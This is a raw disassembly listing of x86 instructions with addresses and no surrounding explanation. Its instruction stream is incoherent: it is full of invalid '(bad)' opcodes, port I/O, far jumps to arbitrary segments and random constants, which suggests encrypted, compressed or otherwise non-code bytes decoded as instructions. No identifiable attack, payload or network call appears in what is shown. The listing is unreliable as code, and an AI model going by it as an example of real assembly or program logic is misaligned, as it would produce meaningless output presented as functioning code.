  42d076:	cmp    eax,0xd9937c30
  42d07b:	jp     0x42d0d9
  42d07d:	sbb    eax,0x226b47d7
  42d082:	add    al,0xec
  42d084:	cmp    bl,BYTE PTR [ecx]
  42d086:	lahf   
  42d087:	jge    0x42d0fa
  42d089:	mov    bl,0x98
  42d08b:	add    al,0xf7
  42d08d:	retf   
  42d08e:	sbb    esi,edx
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [ebx],dl
  42d101:	loopne 0x42d103
  42d103:	and    BYTE PTR [edx+eiz*8],cl
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    al,0x1
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	imul   ecx,DWORD PTR [eax-0x30a569b7],0xffffffb5
  42d113:	mov    eax,ds:0xcce75207
  42d118:	lahf   
  42d119:	dec    ecx
  42d11a:	sub    BYTE PTR [edx+0x3e],dl
  42d11d:	nop
  42d11e:	enter  0xd498,0xeb
  42d122:	and    ah,BYTE PTR [esi]
  42d124:	sub    BYTE PTR [edi+0x35e2ce46],dl
  42d12a:	push   eax
  42d12b:	lea    ebp,[esi-0x16]
  42d12e:	bound  ecx,QWORD PTR ss:[ebx+0x51]
  42d132:	mov    al,ds:0x1e085da6
  42d137:	int3   
  42d138:	push   esi
  42d139:	call   0xd105:0xb7938819
  42d140:	ja     0x42d0c6
  42d142:	mov    eax,gs
  42d144:	in     al,dx
  42d145:	mov    DWORD PTR [eax],edi
  42d147:	retf   
  42d148:	lock xor al,0x18
  42d14b:	mov    al,0x8b
  42d14d:	or     bh,BYTE PTR [edx]
  42d14f:	xor    DWORD PTR [ebx-0x75],ebp
  42d152:	push   ecx
  42d153:	xchg   ecx,eax
  42d154:	iret   
  42d155:	sub    bl,BYTE PTR [eax+0x66]
  42d158:	test   al,0x1f
  42d15a:	loop   0x42d1c0
  42d15c:	or     eax,DWORD PTR [eax+0x772c4e04]
  42d162:	push   eax
  42d163:	test   eax,0x52d8414c
  42d168:	inc    eax
  42d169:	imul   ecx,DWORD PTR [ecx],0x46
  42d16c:	inc    edi
  42d16d:	loopne 0x42d15f
  42d16f:	push   es
  42d170:	aam    0x6c
  42d172:	outs   dx,BYTE PTR ds:[esi]
  42d173:	xor    al,0x93
  42d175:	test   DWORD PTR [ecx+0xe],eax
  42d178:	pop    edx
  42d179:	pop    es
  42d17a:	inc    ecx
  42d17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d17c:	mov    al,0x48
  42d17e:	sahf   
  42d17f:	cdq    
  42d180:	lahf   
  42d181:	aaa    
  42d182:	not    DWORD PTR [eax+0x73c2e14d]
  42d188:	adc    dh,BYTE PTR [ecx-0x68]
  42d18b:	pop    ds
  42d18c:	inc    edi
  42d18d:	in     eax,0x24
  42d18f:	int3   
  42d190:	mov    cl,0x7e
  42d192:	pop    esi
  42d193:	jmp    0xee1e9af8
  42d198:	cmp    edx,ebx
  42d19a:	jo     0x42d1c6
  42d19c:	push   ebx
  42d19d:	pop    ds
  42d19e:	out    dx,al
  42d19f:	test   BYTE PTR [edi-0x7c],0xd7
  42d1a3:	jle    0x42d1cc
  42d1a5:	ins    DWORD PTR es:[edi],dx
  42d1a6:	jbe    0x42d163
  42d1a8:	lods   al,BYTE PTR ds:[esi]
  42d1a9:	gs sti 
  42d1ab:	mov    bl,0xf6
  42d1ad:	scas   al,BYTE PTR es:[edi]
  42d1ae:	(bad)  
  42d1af:	cmp    eax,0x28db9b85
  42d1b4:	push   es
  42d1b5:	push   eax
  42d1b6:	jb     0x42d191
  42d1b8:	or     cl,BYTE PTR [ecx-0x18]
  42d1bb:	cmc    
  42d1bc:	popf   
  42d1bd:	scas   al,BYTE PTR es:[edi]
  42d1be:	imul   ecx,esp,0xffffffb5
  42d1c1:	dec    ebx
  42d1c2:	or     edi,DWORD PTR [edx]
  42d1c4:	add    al,0xa8
  42d1c6:	je     0x42d1fb
  42d1c8:	mov    al,0x99
  42d1ca:	mov    al,0x79
  42d1cc:	mov    esi,0x75f85257
  42d1d1:	retf   0xed0a
  42d1d4:	call   eax
  42d1d6:	and    eax,0xc4ec309b
  42d1db:	add    al,0x70
  42d1dd:	add    edx,edi
  42d1df:	cs cmp eax,0x4053fed6
  42d1e5:	test   BYTE PTR [ebx],dh
  42d1e7:	sub    DWORD PTR [ecx],0xb26ea7d4
  42d1ed:	xor    dl,BYTE PTR [ebp+0x3cec9578]
  42d1f3:	mov    ds:0x1effe035,eax
  42d1f8:	data16 adc ax,0xd507
  42d1fd:	stc    
  42d1fe:	xchg   DWORD PTR [edx+eax*1+0x43e374d3],esp
  42d205:	pop    ss
  42d206:	data16 jae 0x42d1d0
  42d209:	or     esp,DWORD PTR [edi-0x5e]
  42d20c:	ds xchg edi,eax
  42d20e:	cdq    
  42d20f:	mov    eax,DWORD PTR [eax]
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d207
  42d281:	sbb    ah,bh
  42d283:	(bad)  
  42d284:	adc    bl,ah
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	(bad)  
  42d28e:	arpl   WORD PTR [edi-0x36],bp
  42d291:	cmp    eax,0x5a479b6c
  42d296:	ret    0x6ee9
  42d299:	enter  0xa8cb,0x4c
  42d29d:	mov    ds:0x8ea4ed60,al
  42d2a2:	ret    0xb21d
  42d2a5:	pushf  
  42d2a6:	adc    BYTE PTR [edi+ecx*1],cl
  42d2a9:	xchg   edi,eax
  42d2aa:	pop    edx
  42d2ab:	hlt    
  42d2ac:	sbb    eax,0x5f6894ac
  42d2b1:	dec    ecx
  42d2b2:	vsubpd xmm0,xmm2,XMMWORD PTR [ecx-0x621b86bc]
  42d2ba:	retf   
  42d2bb:	inc    edi
  42d2bc:	mov    bl,BYTE PTR [esi-0x24]
  42d2bf:	(bad)  
  42d2c0:	or     edi,ecx
  42d2c2:	dec    edi
  42d2c3:	sbb    bl,dl
  42d2c5:	fs and eax,0xc12f18a9
  42d2cb:	scas   eax,DWORD PTR es:[edi]
  42d2cc:	sub    bh,ah
  42d2ce:	das    
  42d2cf:	(bad)  [ebp+0x11]
  42d2d2:	retf   
  42d2d3:	push   esp
  42d2d4:	call   edx
  42d2d6:	inc    esi
  42d2d7:	sbb    cl,BYTE PTR [ebx-0x54b8b78c]
  42d2dd:	xchg   edi,eax
  42d2de:	fadd   st,st(5)
  42d2e0:	cdq    
  42d2e1:	je     0x42d2ee
  42d2e3:	sahf   
  42d2e4:	pop    edi
  42d2e5:	jno    0x42d275
  42d2e7:	add    bl,ch
  42d2e9:	or     eax,0x683fd04
  42d2ee:	pop    ss
  42d2ef:	inc    esp
  42d2f0:	out    0x19,al
  42d2f2:	xchg   esi,eax
  42d2f3:	addr16 xchg esi,eax
  42d2f5:	in     eax,0x23
  42d2f7:	mov    al,ds:0xd7a7eb07
  42d2fc:	mov    DWORD PTR [edx],esp
  42d2fe:	pop    edi
  42d2ff:	arpl   WORD PTR [ecx-0x79],sp
  42d302:	ins    BYTE PTR es:[edi],dx
  42d303:	test   al,0x57
  42d305:	or     al,0x61
  42d307:	jge    0x42d312
  42d309:	adc    ebp,DWORD PTR [ebx-0x5afed363]
  42d30f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d310:	or     bh,BYTE PTR [edx+0x536edbe9]
  42d316:	in     eax,0xb4
  42d318:	ror    DWORD PTR [ebx+ebx*8-0x48728274],cl
  42d31f:	push   ecx
  42d320:	or     DWORD PTR ss:[ebx],ecx
  42d323:	adc    al,0x78
  42d325:	ret    0x9428
  42d328:	data16 jnp 0x42d354
  42d32b:	push   ebx
  42d32c:	pop    ebp
  42d32d:	stos   DWORD PTR es:[edi],eax
  42d32e:	push   0x41
  42d330:	or     edx,DWORD PTR [eax+0x6934c2b6]
  42d336:	mov    cl,0x88
  42d338:	int3   
  42d339:	bound  esp,QWORD PTR cs:0x475f1cbc
  42d340:	cmp    dh,ah
  42d342:	xchg   DWORD PTR [ebx],edi
  42d344:	lea    esi,[esi-0x8b1681f]
  42d34a:	xor    BYTE PTR [edx+0xd],cl
  42d34d:	mov    ds:0xfef18d17,eax
  42d352:	or     DWORD PTR [edx+0x7f0724e],eax
  42d358:	popa   
  42d359:	push   esp
  42d35a:	jg     0x42d33a
  42d35c:	popa   
  42d35d:	dec    edi
  42d35e:	push   eax
  42d35f:	jecxz  0x42d3bf
  42d361:	jmp    0xeace1a5
  42d366:	lahf   
  42d367:	dec    ebp
  42d368:	inc    esp
  42d369:	inc    edi
  42d36a:	mov    al,ds:0xcff706c
  42d36f:	(bad)  
  42d370:	repz pop ecx
  42d372:	shl    ch,1
  42d374:	mov    al,BYTE PTR [edi+edx*4-0x9]
  42d378:	cmp    edi,DWORD PTR [edi-0x3fccf9d4]
  42d37e:	fsubr  st(5),st
  42d380:	lea    esp,[esi+0x3e]
  42d383:	rep lods eax,DWORD PTR ds:[esi]
  42d385:	or     eax,0xc36c8a4d
  42d38a:	and    al,0x45
  42d38c:	nop
  42d38d:	(bad)  
  42d38e:	out    dx,eax
  42d38f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	arpl   WORD PTR [eax-0x38],ax
  42d403:	xor    DWORD PTR [esp+eiz*8],edx
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    al,0x1
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	mov    eax,DWORD PTR [esi]
  42d40e:	ds push esi
  42d410:	ffreep st(0)
  42d412:	and    eax,0x34a448f5
  42d417:	out    dx,al
  42d418:	pop    edx
  42d419:	loope  0x42d40e
  42d41b:	adc    DWORD PTR [edi+0x67],eax
  42d41e:	adc    BYTE PTR [ebp+0xde4507b],dl
  42d424:	mov    WORD PTR [ebx+0x15],es
  42d427:	mov    ah,0x84
  42d429:	pop    ds
  42d42a:	je     0x42d421
  42d42c:	sar    BYTE PTR [esi],0x24
  42d42f:	imul   esi,esi,0xffffff9c
  42d432:	(bad)  
  42d433:	jecxz  0x42d41a
  42d435:	fxch   st(1)
  42d437:	jns    0x42d467
  42d439:	xor    esi,DWORD PTR [edx-0x76]
  42d43c:	in     eax,0xa5
  42d43e:	scas   eax,DWORD PTR es:[edi]
  42d43f:	mul    BYTE PTR [esi-0xd]
  42d442:	into   
  42d443:	aam    0x7d
  42d445:	xor    al,0x15
  42d447:	nop    DWORD PTR [edx]
  42d44a:	jno    0x42d47a
  42d44c:	xor    al,0xb4
  42d44e:	mov    fs,WORD PTR [edx-0x16]
  42d451:	std    
  42d452:	xor    ebx,DWORD PTR [ebx-0x32]
  42d455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d456:	dec    ecx
  42d457:	jmp    0x2608:0x4043ec1b
  42d45e:	sbb    BYTE PTR [ebx-0x20b7145],cl
  42d464:	std    
  42d465:	mov    ebx,0x304bac6c
  42d46a:	push   ecx
  42d46b:	daa    
  42d46c:	mov    bh,0x26
  42d46e:	sbb    eax,0xeb736f91
  42d473:	aad    0x5e
  42d475:	mov    ds:0xd433dff1,al
  42d47a:	lods   al,BYTE PTR ds:[esi]
  42d47b:	dec    ecx
  42d47c:	xchg   edx,eax
  42d47d:	jl     0x42d493
  42d47f:	iret   
  42d480:	xchg   cl,bl
  42d482:	sbb    ebp,DWORD PTR [eax-0x4c49eb68]
  42d488:	inc    esi
  42d489:	push   ebx
  42d48a:	add    BYTE PTR [edi+0x5ee01452],dh
  42d490:	mov    ebp,0xb2177212
  42d495:	mov    esi,DWORD PTR [ebp+0x5e]
  42d498:	and    eax,0x9a23bb0b
  42d49d:	call   0x6145a1a0
  42d4a2:	jle    0x42d42e
  42d4a4:	repz mov dh,0x77
  42d4a7:	xchg   ah,bl
  42d4a9:	scas   al,BYTE PTR es:[edi]
  42d4aa:	stc    
  42d4ab:	adc    ebx,edx
  42d4ad:	call   0x43b1:0xf07a8405
  42d4b4:	jne    0x42d51c
  42d4b6:	pop    esp
  42d4b7:	ror    BYTE PTR [esi+0x6f],1
  42d4ba:	xor    edx,ebp
  42d4bc:	xor    dh,ah
  42d4be:	xchg   edi,eax
  42d4bf:	push   0x85b4e57f
  42d4c4:	imul   esp,DWORD PTR [ecx-0x13],0x9d8ec393
  42d4cb:	push   ebp
  42d4cc:	jle    0x42d54c
  42d4ce:	cmp    eax,0x76174191
  42d4d3:	mov    ecx,DWORD PTR [ecx-0x4deaf154]
  42d4d9:	mov    esp,?
  42d4db:	dec    esp
  42d4dc:	sub    dh,BYTE PTR [edx]
  42d4de:	xchg   ebx,eax
  42d4df:	fdivr  DWORD PTR [esi+0x37]
  42d4e2:	xchg   edi,eax
  42d4e3:	add    al,BYTE PTR [esi-0x18a3e8a8]
  42d4e9:	cdq    
  42d4ea:	mov    edx,DWORD PTR [ecx+0x2a7c2248]
  42d4f0:	adc    BYTE PTR [esi+0x5411f3b1],ah
  42d4f6:	mov    ebx,0xdd2cf9eb
  42d4fb:	jo     0x42d4cc
  42d4fd:	inc    ecx
  42d4fe:	out    0xab,al
  42d500:	test   al,0x2
  42d502:	ror    BYTE PTR ds:0xd2e94bcb,0xfd
  42d509:	jmp    0x42d4e6
  42d50b:	data16 jnp 0x42d503
  42d50e:	jae    0x42d4aa
	...
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0x4ce8cad5,eax
  42d583:	dec    esp
  42d584:	sbb    ch,ah
  42d586:	add    DWORD PTR [eax],eax
  42d588:	add    al,0x1
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	sbb    al,0xdb
  42d58e:	mov    eax,ds:0x96337470
  42d593:	mov    ch,0xd5
  42d595:	scas   al,BYTE PTR es:[edi]
  42d596:	jg     0x42d5ff
  42d598:	jb     0x42d5cb
  42d59a:	mov    ch,0x2a
  42d59c:	imul   BYTE PTR [esi+0x22]
  42d59f:	(bad)  
  42d5a0:	fiadd  DWORD PTR [edi]
  42d5a2:	(bad)  
  42d5a3:	stc    
  42d5a4:	(bad)  
  42d5a5:	sub    eax,0x436a701d
  42d5aa:	(bad)  
  42d5ab:	fxam   
  42d5ad:	ins    BYTE PTR es:[edi],dx
  42d5ae:	pop    ebx
  42d5af:	call   0x88a8:0xf6754f57
  42d5b6:	push   0xa7c506c4
  42d5bb:	inc    edx
  42d5bc:	mov    bl,0xcc
  42d5be:	fisttp WORD PTR [edi-0x58ea76f2]
  42d5c4:	and    ah,BYTE PTR [edi+0x47]
  42d5c7:	in     al,dx
  42d5c8:	fmul   DWORD PTR [esp+eiz*2]
  42d5cb:	xchg   ecx,eax
  42d5cc:	sahf   
  42d5cd:	dec    edi
  42d5ce:	push   ebx
  42d5cf:	ins    DWORD PTR es:[edi],dx
  42d5d0:	std    
  42d5d1:	mov    esp,0x5a7a96b9
  42d5d6:	mov    ds:0xd4800353,eax
  42d5db:	xor    BYTE PTR [edi],0xdf
  42d5de:	sbb    BYTE PTR [ebp+0x18350f54],ch
  42d5e4:	adc    dh,BYTE PTR [esi+eiz*1+0x48053506]
  42d5eb:	dec    ebp
  42d5ec:	push   0x20
  42d5ee:	mov    ecx,0x5852a093
  42d5f3:	pop    es
  42d5f4:	sbb    DWORD PTR [ecx],0xffffffeb
  42d5f7:	mov    DWORD PTR [eax],edx
  42d5f9:	jnp    0x42d64d
  42d5fb:	repz jecxz 0x42d5f3
  42d5fe:	xchg   esp,eax
  42d5ff:	sbb    cl,cl
  42d601:	xchg   ebp,eax
  42d602:	(bad)  
  42d603:	in     al,dx
  42d604:	adc    DWORD PTR [ebp+0x4e],esp
  42d607:	das    
  42d608:	mov    edi,0x4de49994
  42d60d:	adc    al,0xeb
  42d60f:	sbb    esi,DWORD PTR [ebp+0x487cdad5]
  42d615:	cmp    eax,0xf65b8037
  42d61a:	lds    edx,FWORD PTR [ebx]
  42d61c:	jmp    0x526e80af
  42d621:	jmp    0x42d61e
  42d623:	pop    eax
  42d624:	mov    WORD PTR [edx+0x2],gs
  42d627:	retf   
  42d628:	push   esp
  42d629:	mov    ch,0xee
  42d62b:	cs sbb dh,bl
  42d62e:	mov    edx,0x7c00cf8c
  42d633:	outs   dx,DWORD PTR ds:[esi]
  42d634:	xlat   BYTE PTR ds:[ebx]
  42d635:	out    0x54,eax
  42d637:	push   ds
  42d638:	sub    al,0x70
  42d63a:	shl    BYTE PTR [edx-0x5c],cl
  42d63d:	adc    BYTE PTR [ebp-0x7b],al
  42d640:	in     eax,dx
  42d641:	shl    BYTE PTR [ebx-0x7c01d749],cl
  42d647:	add    al,0xc9
  42d649:	inc    esp
  42d64a:	addr16 shl edi,0x1d
  42d64e:	ja     0x42d635
  42d650:	imul   ebp,DWORD PTR [eax-0x47],0xa4eaefec
  42d657:	pusha  
  42d658:	dec    eax
  42d659:	push   esp
  42d65a:	jo     0x42d607
  42d65c:	loopne 0x42d6ac
  42d65e:	xchg   esi,eax
  42d65f:	bound  esp,QWORD PTR [ebx+edx*4-0x1e1e01fc]
  42d666:	sbb    al,0xd4
  42d668:	push   esp
  42d669:	push   cs
  42d66a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d66b:	push   edx
  42d66c:	sbb    al,0xe4
  42d66e:	add    eax,0xd9007d3c
  42d673:	pop    ds
  42d674:	lahf   
  42d675:	lea    edi,[edx-0x36]
  42d678:	cmp    BYTE PTR [ecx+edi*4-0x452eaec3],ah
  42d67f:	push   edx
  42d680:	sub    dl,BYTE PTR [edi]
  42d682:	jg     0x42d690
  42d684:	add    ecx,edi
  42d686:	xor    al,0x55
  42d688:	push   0xb4dd44d7
  42d68d:	retf   
  42d68e:	pop    es
  42d68f:	jae    0x42d691
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x9e
  42d701:	mov    al,0x1e
  42d703:	push   0x1c
  42d705:	out    0x1,al
  42d707:	add    BYTE PTR [ecx+eax*1],al
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	adc    edx,edx
  42d70e:	sbb    DWORD PTR [edx],esp
  42d710:	mov    eax,ds:0xe7bafb14
  42d715:	push   0x37b8bd9f
  42d71a:	dec    DWORD PTR [ebp+0x1d]
  42d71d:	arpl   WORD PTR [ebp-0x7],di
  42d720:	popf   
  42d721:	test   DWORD PTR [edi],ecx
  42d723:	push   edx
  42d724:	test   BYTE PTR [ecx],ah
  42d726:	je     0x42d77d
  42d728:	das    
  42d729:	push   esp
  42d72a:	fsubr  QWORD PTR ds:0x763ed329
  42d730:	push   0xffffff84
  42d732:	rol    DWORD PTR [eax],0xae
  42d735:	mov    eax,0x2b88baa7
  42d73a:	jns    0x42d760
  42d73c:	dec    ebx
  42d73d:	fs jl  0x42d75d
  42d740:	out    0x30,al
  42d742:	je     0x42d6d4
  42d744:	pushf  
  42d745:	js     0x42d6f9
  42d747:	push   cs
  42d748:	retf   
  42d749:	cmp    BYTE PTR ds:0x47aa4a15,0xa2
  42d750:	fdivr  st,st(7)
  42d752:	mov    al,ds:0xd47eb17d
  42d757:	(bad)  
  42d758:	cmp    BYTE PTR [ebp+0x65],dl
  42d75b:	out    0x2c,al
  42d75d:	sub    bh,BYTE PTR [eax]
  42d75f:	adc    bh,BYTE PTR [eax-0x633a8b0a]
  42d765:	cmp    al,0x90
  42d767:	retf   
  42d768:	xor    esi,ecx
  42d76a:	pop    edx
  42d76b:	xor    BYTE PTR [ebx],0xca
  42d76e:	test   eax,0x60d341f9
  42d773:	pop    ecx
  42d774:	fidiv  DWORD PTR [edi-0x1d]
  42d777:	mov    ch,0xdc
  42d779:	mov    ds:0x169cb42c,al
  42d77e:	icebp  
  42d77f:	jns    0x42d7bb
  42d781:	repnz xchg edi,eax
  42d783:	and    al,0x57
  42d785:	inc    ebp
  42d786:	fldenv [edx+0x1b0b10ae]
  42d78c:	push   esi
  42d78d:	ror    BYTE PTR [di-0x6ae6],cl
  42d792:	lds    edx,FWORD PTR [edx]
  42d794:	or     BYTE PTR [eax+0x4afb32de],cl
  42d79a:	das    
  42d79b:	repz mov ds,WORD PTR [ebx]
  42d79e:	mov    ah,0xe2
  42d7a0:	aam    0xad
  42d7a2:	arpl   WORD PTR [esi-0x59],di
  42d7a5:	es jne 0x42d75c
  42d7a8:	and    dl,BYTE PTR ds:0x18e99c55
  42d7ae:	loop   0x42d7ca
  42d7b0:	jae    0x42d826
  42d7b2:	cmp    BYTE PTR [eax-0x47601f15],cl
  42d7b8:	pop    ebp
  42d7b9:	push   cs
  42d7ba:	push   esi
  42d7bb:	mov    ecx,0xf91613f7
  42d7c0:	push   eax
  42d7c1:	adc    ebp,0xb79b1e7d
  42d7c7:	leave  
  42d7c8:	add    ch,0x5e
  42d7cb:	push   es
  42d7cc:	add    bl,dh
  42d7ce:	(bad)  
  42d7cf:	mov    BYTE PTR [edi-0x651487a0],bh
  42d7d5:	adc    BYTE PTR [edx-0x12],ch
  42d7d8:	(bad)  
  42d7d9:	push   ds
  42d7da:	outs   dx,DWORD PTR ds:[esi]
  42d7db:	mov    ebx,0x23659048
  42d7e0:	cmp    al,0xfb
  42d7e2:	push   ebx
  42d7e3:	cmp    al,bh
  42d7e5:	mov    ebp,0x1100a2ff
  42d7ea:	call   0xfab104cf
  42d7ef:	mov    ds:0x4e0c84f3,eax
  42d7f4:	pusha  
  42d7f5:	sahf   
  42d7f6:	and    DWORD PTR [ebx+0x12],0x14f25bb5
  42d7fd:	pushf  
  42d7fe:	fild   QWORD PTR [eax+0x3d]
  42d801:	out    0xe7,eax
  42d803:	lds    esp,FWORD PTR [ebx-0x3c]
  42d806:	dec    ecx
  42d807:	mov    dh,0x32
  42d809:	mov    dl,0x92
  42d80b:	aam    0xc
  42d80d:	out    dx,eax
  42d80e:	imul   ebp,DWORD PTR [ecx+0x0],0x0
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xd5c6961a
  42d881:	(bad)  
  42d882:	es adc al,0x20
  42d885:	out    0x1,eax
  42d887:	add    BYTE PTR [ecx+eax*1],al
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	pop    ss
  42d88d:	pop    eax
  42d88e:	fmulp  st(1),st
  42d890:	loop   0x42d8dc
  42d892:	xlat   BYTE PTR ds:[ebx]
  42d893:	adc    al,0x67
  42d895:	or     eax,DWORD PTR [ecx]
  42d897:	inc    edx
  42d898:	fwait
  42d899:	cmp    cl,bh
  42d89b:	rol    DWORD PTR [ecx+ebx*1],0x14
  42d89f:	fwait
  42d8a0:	add    eax,0x58e9d92b
  42d8a5:	cdq    
  42d8a6:	icebp  
  42d8a7:	imul   esp,DWORD PTR [ebp-0x61],0x9dde7fd
  42d8ae:	mov    eax,ds:0xfeaf5f82
  42d8b3:	int3   
  42d8b4:	mov    bh,0xae
  42d8b6:	stos   BYTE PTR es:[edi],al
  42d8b7:	xchg   esp,eax
  42d8b8:	popa   
  42d8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d8ba:	adc    ecx,DWORD PTR [esi+0x1f]
  42d8bd:	xchg   ecx,eax
  42d8be:	test   DWORD PTR [ecx+0x24f12eec],0xc13fecce
  42d8c8:	jl     0x42d940
  42d8ca:	bswap  eax
  42d8cc:	mov    ch,0xf5
  42d8ce:	jge    0x42d894
  42d8d0:	dec    ecx
  42d8d1:	jmp    0xceab878a
  42d8d6:	cwde   
  42d8d7:	enter  0xc9c8,0xf2
  42d8db:	push   0x8a6e6319
  42d8e0:	test   ch,dl
  42d8e2:	inc    esp
  42d8e3:	inc    ebx
  42d8e4:	bswap  edx
  42d8e6:	push   edx
  42d8e7:	iret   
  42d8e8:	ficom  DWORD PTR [ebx-0x48]
  42d8eb:	imul   ecx,DWORD PTR ds:[ebp+0x3524d52b],0xffffffec
  42d8f3:	test   BYTE PTR [ebx+0x347a172c],0x71
  42d8fa:	xlat   BYTE PTR ds:[ebx]
  42d8fb:	scas   eax,DWORD PTR es:[edi]
  42d8fc:	mov    ebx,ebx
  42d8fe:	int    0x7e
  42d900:	leave  
  42d901:	in     al,dx
  42d902:	mov    esi,DWORD PTR [ebx+0x35]
  42d905:	adc    eax,DWORD PTR [esp+edx*4-0x61]
  42d909:	test   BYTE PTR [ebx],ah
  42d90b:	and    ch,BYTE PTR [edx]
  42d90d:	sahf   
  42d90e:	pop    ebp
  42d90f:	(bad)  
  42d910:	push   esp
  42d911:	out    0x60,al
  42d913:	adc    DWORD PTR [edi-0x2b],ebp
  42d916:	lods   eax,DWORD PTR ds:[esi]
  42d917:	add    al,0xd3
  42d919:	ins    DWORD PTR es:[edi],dx
  42d91a:	not    DWORD PTR [edx+0x12]
  42d91d:	xor    dh,ch
  42d91f:	jmp    0x42d8a6
  42d921:	idiv   DWORD PTR [esi-0x6a]
  42d924:	add    DWORD PTR ds:0x51f3b1be,edx
  42d92a:	in     eax,0x98
  42d92c:	jecxz  0x42d912
  42d92e:	or     edi,DWORD PTR [esi]
  42d930:	cld    
  42d931:	sbb    edi,esi
  42d933:	pop    esi
  42d934:	sub    eax,0x893e2fd2
  42d939:	jmp    0x99fd:0xf60bc70e
  42d940:	lahf   
  42d941:	mov    ch,0x9d
  42d943:	xchg   DWORD PTR [esi],ebx
  42d945:	inc    ecx
  42d946:	inc    esp
  42d947:	adc    al,BYTE PTR [edx-0x5b]
  42d94a:	jecxz  0x42d90e
  42d94c:	sub    ebx,DWORD PTR [esi+0x5c]
  42d94f:	xor    eax,0xfd505f1d
  42d954:	fs cmc 
  42d956:	push   0xfffffff0
  42d958:	and    ebx,edx
  42d95a:	enter  0x1246,0xaa
  42d95e:	xchg   ebx,eax
  42d95f:	or     BYTE PTR [esi],ah
  42d961:	mov    dl,0x2a
  42d963:	sbb    eax,0x61bdf909
  42d968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d969:	stos   BYTE PTR es:[edi],al
  42d96a:	mov    DWORD PTR [edi],0x8ed44adb
  42d970:	xchg   ecx,eax
  42d971:	outs   dx,BYTE PTR ds:[esi]
  42d972:	dec    edx
  42d973:	mov    bh,0x69
  42d975:	push   ds
  42d976:	inc    ebx
  42d977:	ins    BYTE PTR es:[edi],dx
  42d978:	dec    esp
  42d979:	pop    edi
  42d97a:	in     eax,0xa8
  42d97c:	xchg   edx,eax
  42d97d:	ret    
  42d97e:	lea    esi,[eax-0x61]
  42d981:	jl     0x42d9c6
  42d983:	pop    edi
  42d984:	dec    eax
  42d985:	and    DWORD PTR [bx+si+0x15dc],esi
  42d98a:	(bad)  
  42d98b:	out    dx,al
  42d98c:	add    al,BYTE PTR [edi-0x54]
  42d98f:	mov    DWORD PTR [eax],eax
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	xor    ebp,esp
  42da02:	and    eax,0x1e8246f
  42da07:	add    BYTE PTR [ecx+eax*1],al
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	scas   al,BYTE PTR es:[edi]
  42da0d:	sub    al,0xd0
  42da0f:	xchg   ebx,eax
  42da10:	pop    es
  42da11:	adc    BYTE PTR [eax-0xed5a7ec],0x88
  42da18:	mov    ebx,0xf7f5c432
  42da1d:	lods   eax,DWORD PTR ds:[esi]
  42da1e:	sbb    al,0xe1
  42da20:	lock sub al,0x50
  42da23:	rcr    BYTE PTR [ebx-0x467527bc],cl
  42da29:	fisttp QWORD PTR [ebp+ecx*1-0x477d8995]
  42da30:	mov    esp,DWORD PTR [edi+edi*8]
  42da33:	push   0xffffffaf
  42da35:	pop    ss
  42da36:	test   al,0x68
  42da38:	fldpi  
  42da3a:	shl    DWORD PTR [esi-0x6124af80],cl
  42da40:	xchg   DWORD PTR [eax],esi
  42da42:	jo     0x42da42
  42da44:	outs   dx,BYTE PTR ds:[esi]
  42da45:	les    eax,FWORD PTR [esi-0x159f8938]
  42da4b:	(bad)  
  42da4c:	mov    edi,0x71e700a
  42da51:	in     al,0x3d
  42da53:	dec    ecx
  42da54:	adc    BYTE PTR [ebp-0x64f3cb51],cl
  42da5a:	jl     0x42dace
  42da5c:	shr    BYTE PTR [ebp-0x750e19cf],1
  42da62:	call   0x72ee:0x7a7d5907
  42da69:	inc    esi
  42da6a:	aaa    
  42da6b:	xchg   ebp,eax
  42da6c:	jmp    0xc7b3e9b7
  42da71:	ss push esp
  42da73:	aaa    
  42da74:	inc    ebp
  42da75:	stc    
  42da76:	sub    DWORD PTR [edi+0x32],esi
  42da79:	xchg   ecx,eax
  42da7a:	and    al,bl
  42da7c:	retf   
